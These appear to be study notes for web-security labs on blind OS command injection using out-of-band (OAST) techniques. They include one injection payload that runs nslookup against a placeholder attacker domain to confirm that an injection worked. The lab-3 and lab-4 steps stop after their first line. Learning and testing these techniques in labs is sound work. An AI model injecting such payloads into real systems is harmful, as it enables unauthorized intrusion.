You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.
**Example** - 
```python
|| nslookup kgji2ohoyw.web-attacker.com || 
```
- This payload uses the `nslookup` command to cause a DNS lookup for the specified domain.
- The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

## Steps to solve the lab-3
### Desc - Blind OS command injection with out-of-band interaction

1. Inserting details in the website:

## Steps to solve the lab-4
### Desc - Blind OS command injection with out-of-band interaction# Blind OS command injection with out-of-band data exfiltration

1. Inserting details in the website:
